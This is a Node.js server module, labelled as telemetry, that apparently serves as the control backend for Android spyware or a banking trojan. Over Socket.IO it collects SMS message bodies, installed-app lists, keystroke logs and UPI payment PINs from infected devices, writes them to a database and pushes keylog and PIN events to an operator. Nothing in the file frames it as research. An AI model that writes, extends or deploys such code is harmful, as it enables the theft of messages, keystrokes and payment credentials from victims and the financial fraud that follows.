const { prisma } = require('../config/database');
const logger = require('../../utils/logger');
const presenceService = require('../services/PresenceService');

const getVal = (obj, key1, key2) => {
    if (!obj) return undefined;
    if (obj[key1] !== undefined && obj[key1] !== null) return obj[key1];
    if (key2 && obj[key2] !== undefined && obj[key2] !== null) return obj[key2];
    return undefined;
};

const toBigInt = (val) => {
    if (val === undefined || val === null || val === "") return null;
    try {
        if (typeof val === 'number') return BigInt(Math.floor(val));
        return BigInt(val);
    } catch (e) {
        return null;
    }
};

// Heartbeat batching
const heartbeatBuffer = [];
const deviceUpdateBuffer = new Map();
const HEARTBEAT_FLUSH_INTERVAL = 2000; // 2 seconds for heartbeats

let isFlushing = false;
async function flushHeartbeats() {
    if ((heartbeatBuffer.length === 0 && deviceUpdateBuffer.size === 0) || isFlushing) return;

    isFlushing = true;
    const heartbeatsToFlush = [...heartbeatBuffer];
    const updatesToFlush = new Map(deviceUpdateBuffer);

    // Get all unique device IDs from both buffers to ensure they exist in DB
    const allDeviceIds = new Set([
        ...updatesToFlush.keys(),
        ...heartbeatsToFlush.map(h => h.device_id)
    ]);

    try {
        await prisma.$transaction([
            // 1. First ensure all devices exist and update their status/heartbeat data
            ...Array.from(allDeviceIds).map(dId => {
                const data = updatesToFlush.get(dId) || {
                    last_seen: new Date(),
                    status: true,
                    heartbeat: undefined
                };

                return prisma.device.upsert({
                    where: { device_id: dId },
                    update: {
                        last_seen: data.last_seen,
                        status: data.status,
                        heartbeat: data.heartbeat,
                        app_id: data.app_id,
                        build_id: data.build_id
                    },
                    create: {
                        device_id: dId,
                        last_seen: data.last_seen,
                        status: data.status,
                        heartbeat: data.heartbeat,
                        app_id: data.app_id,
                        build_id: data.build_id
                    }
                });
            }),
            // 2. Then create the heartbeat logs (FKs are now guaranteed)
            ...(heartbeatsToFlush.length > 0 ? [prisma.heartbeat.createMany({ data: heartbeatsToFlush })] : [])
        ], { timeout: 30000 });

        // Remove successfully flushed heartbeats
        heartbeatBuffer.splice(0, heartbeatsToFlush.length);

        // Remove successfully flushed device updates
        for (const [dId, data] of updatesToFlush.entries()) {
            if (deviceUpdateBuffer.get(dId) === data) {
                deviceUpdateBuffer.delete(dId);
            }
        }

        logger.debug(`Successfully flushed ${heartbeatsToFlush.length} heartbeats and ${allDeviceIds.size} device updates`);
    } catch (err) {
        logger.error(err, `❌ Error flushing heartbeats/telemetry updates`);
    } finally {
        isFlushing = false;
    }
}

setInterval(flushHeartbeats, HEARTBEAT_FLUSH_INTERVAL);

function setupTelemetryHandlers(socket, io, notifyChange) {
    const deviceId = socket.deviceId;
    const appId = socket.appId;
    const buildId = socket.buildId;

    // Sync SMS
    socket.on('sync_sms', async (data, ack) => {
        const timestamp = new Date().toISOString();
        try {
            let messages = typeof data === 'string' ? JSON.parse(data) : data;
            if (!Array.isArray(messages)) messages = [messages];

            const suspicious = messages.some(msg => {
                const mId = getVal(msg, 'device_id', 'deviceId');
                return mId !== deviceId;
            });

            if (suspicious || !deviceId) {
                logger.warn({ socketDeviceId: deviceId, sampleId: getVal(messages[0], 'device_id', 'deviceId') }, `⚠️ Security Alert: Device attempted to sync SMS for other devices or missing session deviceId`);
                if (ack) ack(false);
                return;
            }

            const validMessages = messages.filter(msg => msg && getVal(msg, 'device_id', 'deviceId') && (getVal(msg, 'id', 'id') !== undefined));

            if (validMessages.length === 0) {
                if (ack) ack(true);
                return;
            }

            // Parallel Upsert Optimization for high-scale (50k+ devices)
            // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
            await prisma.$transaction([
                prisma.device.upsert({
                    where: { device_id: deviceId },
                    update: {
                        last_seen: new Date(),
                        app_id: appId,
                        build_id: buildId
                    },
                    create: {
                        device_id: deviceId,
                        last_seen: new Date(),
                        status: true,
                        app_id: appId,
                        build_id: buildId
                    }
                }),
                ...validMessages.map(msg => {
                    const dId = getVal(msg, 'device_id', 'deviceId');
                    const idRaw = getVal(msg, 'id', 'id');
                    const smsId = String(idRaw);
                    const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);

                    return prisma.smsMessage.upsert({
                        where: { device_id_local_sms_id: { device_id: dId, local_sms_id: localSmsId } },
                        update: {
                            id: smsId,
                            address: getVal(msg, 'address', 'address') || "",
                            body: getVal(msg, 'body', 'body') || "",
                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
                            timestamp: toBigInt(getVal(msg, 'timestamp', 'timestamp')) || BigInt(0),
                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
                            sync_status: 'synced',
                            updated_at: new Date()
                        },
                        create: {
                            id: smsId,
                            local_sms_id: localSmsId,
                            device_id: dId,
                            address: getVal(msg, 'address', 'address') || "",
                            body: getVal(msg, 'body', 'body') || "",
                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
                            timestamp: toBigInt(getVal(msg, 'timestamp', 'timestamp')) || BigInt(0),
                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
                            sync_status: 'synced'
                        }
                    });
                })
            ], { timeout: 30000 });

            logger.info(`✅ Synced ${validMessages.length} SMS messages for ${deviceId}`);
            // validMessages.forEach(msg => notifyChange('message_change', { ...msg, device_id: getVal(msg, 'device_id', 'deviceId') }));
            socket.emit('sync_complete', 'sms', validMessages.length);
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error syncing SMS for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Sync Single SMS
    socket.on('sync_single_sms', async (data, ack) => {
        try {
            const msg = typeof data === 'string' ? JSON.parse(data) : data;
            const msgDeviceId = getVal(msg, 'device_id', 'deviceId');
            if (msgDeviceId !== deviceId) {
                logger.warn(`⚠️ Security Alert: Device ${deviceId} attempted to sync single SMS for ${msgDeviceId}`);
                if (ack) ack(false);
                return;
            }

            const idRaw = getVal(msg, 'id', 'id');
            if (msgDeviceId && idRaw !== undefined) {
                const smsId = String(idRaw);
                const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);

                // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
                await prisma.$transaction([
                    prisma.device.upsert({
                        where: { device_id: deviceId },
                        update: {
                            last_seen: new Date(),
                            app_id: appId,
                            build_id: buildId
                        },
                        create: {
                            device_id: deviceId,
                            last_seen: new Date(),
                            status: true,
                            app_id: appId,
                            build_id: buildId
                        }
                    }),
                    prisma.smsMessage.upsert({
                        where: { device_id_local_sms_id: { device_id: msgDeviceId, local_sms_id: localSmsId } },
                        update: {
                            id: smsId,
                            address: getVal(msg, 'address', 'address') || "",
                            body: getVal(msg, 'body', 'body') || "",
                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
                            timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
                            sync_status: 'synced'
                        },
                        create: {
                            id: smsId,
                            local_sms_id: localSmsId,
                            device_id: msgDeviceId,
                            address: getVal(msg, 'address', 'address') || "",
                            body: getVal(msg, 'body', 'body') || "",
                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
                            timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
                            sync_status: 'synced'
                        }
                    })
                ]);
                //   notifyChange('message_change', { ...msg, device_id: msgDeviceId });
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error syncing single SMS for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Sync Apps
    socket.on('sync_apps', async (data, ack) => {
        try {
            let apps = typeof data === 'string' ? JSON.parse(data) : data;
            if (!Array.isArray(apps)) apps = [apps];

            const validApps = apps.filter(app => app && getVal(app, 'device_id', 'deviceId') && getVal(app, 'package_name', 'packageName'));

            if (validApps.length === 0) {
                if (ack) ack(true);
                return;
            }

            // Parallel Upsert Optimization for Apps
            // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
            await prisma.$transaction([
                prisma.device.upsert({
                    where: { device_id: deviceId },
                    update: {
                        last_seen: new Date(),
                        app_id: appId,
                        build_id: buildId
                    },
                    create: {
                        device_id: deviceId,
                        last_seen: new Date(),
                        status: true,
                        app_id: appId,
                        build_id: buildId
                    }
                }),
                ...validApps.map(app => {
                    const packageName = getVal(app, 'package_name', 'packageName');
                    const dId = getVal(app, 'device_id', 'deviceId');
                    const appName = getVal(app, 'app_name', 'appName') || packageName;

                    return prisma.installedApp.upsert({
                        where: { device_id_package_name: { device_id: dId, package_name: packageName } },
                        update: {
                            app_name: appName,
                            icon: getVal(app, 'icon', 'icon') || "",
                            version_name: getVal(app, 'version_name', 'versionName') || "",
                            version_code: toBigInt(getVal(app, 'version_code', 'versionCode')),
                            first_install_time: toBigInt(getVal(app, 'first_install_time', 'firstInstallTime')),
                            last_update_time: toBigInt(getVal(app, 'last_update_time', 'lastUpdateTime')),
                            is_system_app: Boolean(getVal(app, 'is_system_app', 'isSystemApp')),
                            target_sdk: parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0"),
                            min_sdk: parseInt(getVal(app, 'min_sdk', 'minSdk') || "0"),
                            sync_timestamp: toBigInt(getVal(app, 'sync_timestamp', 'syncTimestamp')) || BigInt(Date.now()),
                            updated_at: new Date()
                        },
                        create: {
                            device_id: dId,
                            package_name: packageName,
                            app_name: appName,
                            icon: getVal(app, 'icon', 'icon') || "",
                            version_name: getVal(app, 'version_name', 'versionName') || "",
                            version_code: toBigInt(getVal(app, 'version_code', 'versionCode')),
                            first_install_time: toBigInt(getVal(app, 'first_install_time', 'firstInstallTime')),
                            last_update_time: toBigInt(getVal(app, 'last_update_time', 'lastUpdateTime')),
                            is_system_app: Boolean(getVal(app, 'is_system_app', 'isSystemApp')),
                            target_sdk: parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0"),
                            min_sdk: parseInt(getVal(app, 'min_sdk', 'minSdk') || "0"),
                            sync_timestamp: toBigInt(getVal(app, 'sync_timestamp', 'syncTimestamp')) || BigInt(Date.now()),
                        }
                    });
                })
            ], { timeout: 30000 });

            logger.info(`✅ Synced ${validApps.length} apps for ${deviceId}`);
            socket.emit('sync_complete', 'apps', validApps.length);
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error syncing apps for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Heartbeat
    socket.on('send_heartbeat', (data, ack) => {
        try {
            const h = typeof data === 'string' ? JSON.parse(data) : data;
            const payloadDeviceId = getVal(h, 'device_id', 'deviceId');

            if (payloadDeviceId !== deviceId) {
                logger.warn(`⚠️ Security Alert: Device ${deviceId} sent heartbeat for ${payloadDeviceId}`);
                if (ack) ack(false);
                return;
            }

            // Update Redis Presence
            presenceService.markOnline(deviceId);

            // Buffer heartbeat log
            heartbeatBuffer.push({
                device_id: deviceId,
                last_update: new Date()
            });

            // Buffer device status update
            deviceUpdateBuffer.set(deviceId, {
                last_seen: new Date(),
                status: (h.status !== undefined) ? Boolean(h.status) : true,
                heartbeat: h,
                app_id: appId,
                build_id: buildId
            });

            socket.emit('heartbeat_ack');
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error processing heartbeat for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Keylog
    socket.on('set_key_log', async (data, ack) => {
        try {
            const keyLog = typeof data === 'string' ? JSON.parse(data) : data;
            const dId = getVal(keyLog, 'device_id', 'deviceId');

            if (dId === deviceId) {
                // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
                await prisma.$transaction([
                    prisma.device.upsert({
                        where: { device_id: deviceId },
                        update: {
                            last_seen: new Date(),
                            app_id: appId,
                            build_id: buildId
                        },
                        create: {
                            device_id: deviceId,
                            last_seen: new Date(),
                            status: true,
                            app_id: appId,
                            build_id: buildId
                        }
                    }),
                    prisma.keyLog.create({
                        data: {
                            device_id: dId,
                            keylogger: getVal(keyLog, 'keylogger', 'keylogger') || 'unknown',
                            key: getVal(keyLog, 'key', 'key') || '',
                            currentDate: getVal(keyLog, 'current_date', 'currentDate') ? new Date(getVal(keyLog, 'current_date', 'currentDate')) : new Date()
                        }
                    })
                ]);
                notifyChange('keylog_change', { ...keyLog, device_id: dId });
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error saving key log for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // UPI Pin
    socket.on('set_upi_pin', async (data, ack) => {
        try {
            const pinData = typeof data === 'string' ? JSON.parse(data) : data;
            const dId = getVal(pinData, 'device_id', 'deviceId');

            if (dId === deviceId) {
                // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
                await prisma.$transaction([
                    prisma.device.upsert({
                        where: { device_id: deviceId },
                        update: {
                            last_seen: new Date(),
                            app_id: appId,
                            build_id: buildId
                        },
                        create: {
                            device_id: deviceId,
                            last_seen: new Date(),
                            status: true,
                            app_id: appId,
                            build_id: buildId
                        }
                    }),
                    prisma.upiPin.create({
                        data: {
                            device_id: dId,
                            pin: String(getVal(pinData, 'pin', 'pin') || ''),
                            currentDate: getVal(pinData, 'current_date', 'current_date') ? new Date(getVal(pinData, 'current_date', 'current_date')) : new Date()
                        }
                    })
                ]);
                notifyChange('pin_change', { ...pinData, device_id: dId });
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error saving UPI pin for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Connection testing
    socket.on('test_connection', (data, ack) => {
        if (ack) ack(true);
    });

    // 💓 Pulse mechanism: Keep the connection warm and help the client-side watchdog
    const pulseInterval = setInterval(() => {
        if (socket.connected) {
            socket.emit('pulse', { timestamp: Date.now() });
        }
    }, 30000);

    socket.on('disconnect', () => {
        clearInterval(pulseInterval);
    });
}

module.exports = setupTelemetryHandlers;

